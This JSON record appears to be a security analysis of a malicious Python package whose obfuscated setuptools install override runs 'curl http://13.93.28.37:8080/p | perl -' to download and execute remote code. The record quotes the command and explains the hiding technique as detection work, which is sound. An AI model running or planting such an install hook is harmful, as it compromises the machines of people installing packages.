{
  "purpose": "Custom installation script that overrides the default install command",
  "sources": "The subprocess call within the class method invoked during installation",
  "sinks": "The subprocess call executing a shell command that fetches data from an external URL and executes it via Perl",
  "flows": "During installation, the overridden method runs 'curl http://13.93.28.37:8080/p | perl -', which downloads and executes remote code",
  "anomalies": "The method name is obfuscated and does not follow standard conventions; the URL is hardcoded and suspicious; code execution occurs during installation process",
  "analysis": "The code imports subprocess and overrides the 'install' command from setuptools. In the custom class, the method 'vJtnYuXlycyMflxgXwDdERJlFlWWwkxN' executes a shell command that fetches a script from an external IP address and pipes it directly into Perl for execution. The URL appears suspicious, and executing external code during package installation indicates malicious intent. The obfuscated method and class names are unusual and likely designed to hide malicious activity. The setup configuration includes arbitrary metadata and links the custom class to the install command, ensuring the malicious code runs when the package is installed.",
  "conclusion": "The code contains a clear malicious behavior: it downloads and executes remote code during installation, likely to compromise systems. The obfuscation and hardcoded external URL strongly suggest malicious intent. This package poses a high security risk and should not be used.",
